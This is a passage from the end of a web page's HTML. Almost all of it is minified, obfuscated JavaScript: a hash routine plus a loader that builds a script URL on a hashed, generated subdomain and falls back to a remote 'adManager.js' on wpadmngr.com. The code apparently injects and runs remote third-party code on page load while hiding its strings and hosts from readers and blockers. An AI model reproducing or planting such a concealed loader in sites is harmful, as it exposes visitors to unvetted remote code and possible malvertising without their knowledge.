X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>